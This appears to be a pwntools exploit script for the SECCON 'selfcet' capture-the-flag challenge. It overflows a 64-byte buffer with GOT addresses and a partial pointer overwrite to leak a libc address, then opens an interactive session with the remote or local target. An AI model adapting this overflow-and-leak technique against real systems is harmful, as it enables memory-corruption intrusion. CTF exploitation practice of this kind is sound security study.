from pwn import *
elf_file = FILENAME = './xor'
elf = context.binary = ELF(elf_file)
context.log_level = 'debug' # output verbose log


HOST = 'selfcet.seccon.games'
POST = '9999'
#libc = ELF("./libc.so.6")

def main():
  while True:
    try:
      if len(sys.argv) > 1 and sys.argv[1] == 'r':
        c = remote(HOST, POST)
      elif len(sys.argv) > 1 and sys.argv[1] == 'd':
       #c = process(FILENAME)
        c = gdb.debug(FILENAME,gdbscript='''
        b *main+71
        b *main+110
        ''')
      else:
        c = process(FILENAME)

      dummy = 'a'*64 #0x403ff8 = err ptr
      payload = dummy +p64(0x403ff8)+p64(0x403ff8)+'\x10\x11'
      c.send(payload)
      c.recvuntil("xor: ")
      leak_err = u64(c.recvline().rstrip() + "\x00\x00")
      print(hex(leak_err))
      c.interactive()
      exit()

    except EOFError:
      c.close()
      exit()




if __name__ == "__main__":
    main()